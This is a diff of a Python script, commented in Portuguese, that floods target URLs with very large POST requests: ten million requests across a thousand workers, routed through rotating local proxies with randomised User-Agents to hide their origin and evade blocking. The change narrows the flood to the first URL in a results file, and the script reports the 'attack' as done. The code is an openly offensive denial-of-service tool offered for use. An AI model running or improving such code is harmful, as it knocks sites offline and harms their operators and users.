@@ -7,24 +7,19 @@ import random
 
 # Definir proxies (se necessário)
 proxies = [
-    {"http": "http://127.0.0.1:8118"},
-    {"http": "http://127.0.0.1:8119"},
-    {"http": "http://127.0.0.1:8120"},
-    {"http": "http://127.0.0.1:8121"},
-    {"http": "http://127.0.0.1:8122"},
-    {"http": "http://127.0.0.1:8123"},
-    {"http": "http://127.0.0.1:8124"},
-    {"http": "http://127.0.0.1:8125"},
+    {"http": "http://localhost:8119"},
+    {"http": "http://localhost:8120"},
+    {"http": "http://localhost:8121"},
+    {"http": "http://localhost:8122"}
 ]
 
 def get_urls():
     urls = []
-    with open("results.txt", "r") as r:
+    with open("results2.txt", "r") as r:
         for line in r:
-            # Separar a linha por ';' e pegar o último elemento (a URL)
             parts = line.strip().split(';')
-            if len(parts) >= 3:  # Certifica-se de que há ao menos 3 partes
-                url = parts[2].strip()  # Pega a URL e remove espaços em branco
+            if len(parts) >= 3: 
+                url = parts[2].strip()
                 urls.append(url)
     return urls
     
@@ -35,10 +30,9 @@ def load_user_agents(filename):
         return [line.strip() for line in f.readlines()]
 
 # Função para fazer requisição POST com payload menor e log detalhado
-def make_post_request(payload_size, user_agents, session):
+def make_post_request(url, payload_size, user_agents, session):
     try:
-        urls = get_urls()
-        url = random.choice(urls)
+        
         proxy = random.choice(proxies)
         # Seleciona um User-Agent aleatório da lista
         user_agent = random.choice(user_agents)
@@ -86,8 +80,8 @@ if __name__ == "__main__":
     payload_size = payload_size_mb * 1024 * 1024
     
     start_time = time.time()
-    
-    attack(10000000, payload_size, 1000, user_agents)
+    urls = get_urls()
+    attack(urls[0], 10000000, payload_size, 1000, user_agents)
     
     end_time = time.time()
     print(f"\n[INFO] Ataque realizado em {end_time - start_time:.2f} segundos.")
